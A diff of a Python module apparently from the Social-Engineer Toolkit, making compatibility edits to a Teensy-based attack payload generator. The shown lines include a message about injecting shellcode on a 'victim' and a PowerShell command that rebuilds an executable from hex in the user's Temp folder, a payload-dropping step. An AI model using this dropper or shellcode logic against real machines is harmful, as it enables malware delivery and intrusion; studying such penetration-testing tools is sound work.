@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 from __future__ import print_function
 import binascii,base64,sys,os,random,string,subprocess,socket
 from src.core.setcore import *
@@ -124,12 +124,12 @@ try:
 
 # except keyboardintterupts here
 except KeyboardInterrupt:
-    print("""
+    print(r"""
     .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
     |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
     `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
-                                               disabled.\n""")
-
+                                               disabled.""")
+    print()
     sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")
 
 print_status("Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim...")
@@ -157,7 +157,7 @@ rev_counter = 0
 output_variable = "/* Teensy Hex to File Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K) - file ext changed to .ino and prog_char & PROGMEM modified */\n#include <avr/pgmspace.h>\n"
 
 # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
-powershell_command = str("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))
+powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))
 
 ########################################################################################################################################################################################################
 #
